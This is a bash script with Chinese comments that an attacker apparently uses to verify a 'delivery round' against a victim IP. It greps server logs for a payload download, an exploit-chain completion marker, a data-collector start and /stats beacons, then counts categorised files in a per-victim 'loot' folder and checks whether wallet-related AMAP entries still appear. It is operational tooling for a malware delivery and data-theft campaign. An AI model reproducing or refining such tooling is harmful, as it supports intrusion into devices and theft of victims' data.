#!/bin/bash
# check_delivery.sh — 一轮投递后的快速核对
# 用法: ./check_delivery.sh <IP> [起始时间 HH:MM，默认 1 小时前]
# 输出: 拉取时间/大小 → 链完成时间 → 采集器启动时间/时延 → 本次落地分类统计
IP="$1"
SINCE="${2:-$(date -u -d '-60 min' +%H:%M)}"
LOG=/www/wwwlogs/i.131422.com.log
LOOT=/www/wwwroot/i.131422.com/loot
[ -z "$IP" ] && { echo "用法: $0 <IP> [起始HH:MM]"; exit 1; }

echo "════════ 投递核对: $IP  (自 $SINCE UTC 起) ════════"

echo "── ① 拉取 payload ──"
tail -400000 "$LOG" | grep -a "$IP" | grep -a "pe/d7e1006d" | awk -v s="$SINCE" '
{ t=$4; gsub(/\[10\/Sep\/2026:/,"",t); gsub(/\]/,"",t);
  if (t>=s) printf "  %s  大小=%s  %s\n", t, $10, ($10=="511935"?"← AMAP修复版":"← 原版/其它") }' | tail -6

echo "── ② 链完成 (rw4:alldone) ──"
tail -400000 "$LOG" | grep -a "$IP" | grep -a "rw4%3Aalldone" | awk -v s="$SINCE" '
{ t=$4; gsub(/\[10\/Sep\/2026:/,"",t); gsub(/\]/,"",t); if (t>=s) print "  " t }' | tail -4

echo "── ③ 采集器启动 (pe:fd:log:start) ──"
tail -400000 "$LOG" | grep -a "$IP" | grep -a "pe%3Afd%3Alog%3Astart" | awk -v s="$SINCE" '
{ t=$4; gsub(/\[10\/Sep\/2026:/,"",t); gsub(/\]/,"",t); if (t>=s) print "  " t }' | tail -4

echo "── ④ /stats 上报数 ──"
tail -400000 "$LOG" | grep -a "$IP" | grep -a "POST /stats" | awk -v s="$SINCE" '
{ t=$4; gsub(/\[10\/Sep\/2026:/,"",t); gsub(/\]/,"",t); if (t>=s) n++ } END { print "  " (n+0) " 条" }'

BDIR="$LOOT/$IP"
if [ -d "$BDIR" ]; then
  echo "── ⑤ 本次落地分类（ext_stats） ──"
  ls "$BDIR"/ext_stats_*.bin.parsed.json 2>/dev/null | tail -400 | while read f; do
    python3 -c "
import json,sys
try: d=json.load(open('$f'))
except Exception: sys.exit()
c=str(d.get('category'))
t=int('$f'.split('_')[-1].replace('.bin.parsed.json',''))//1000
print('%d|%s' % (t,c))"
  done | awk -F'|' -v s="$(date -u -d '2026-09-10 '"$SINCE" +%s)" '$1>=s {print $2}' | sort | uniq -c | sort -rn | head -12 | sed 's/^/  /'
  echo "  ── AMAP 检查 ──"
  ls "$BDIR"/ext_stats_*.bin.parsed.json 2>/dev/null | tail -400 | while read f; do
    python3 -c "
import json,sys
try: d=json.load(open('$f'))
except Exception: sys.exit()
t=int('$f'.split('_')[-1].replace('.bin.parsed.json',''))//1000
print('%d|%s' % (t,str(d.get('category'))))"
  done | awk -F'|' -v s="$(date -u -d '2026-09-10 '"$SINCE" +%s)" '$1>=s && $2=="wallet-com-autonavi-amap"' | wc -l \
    | awk '{ if ($1==0) print "  ✅ 无 wallet-com-autonavi-amap（修复生效）"; else print "  ❌ 仍有 " $1 " 条 AMAP（修复未生效）" }'
fi
echo "════════════════════════════════════════"
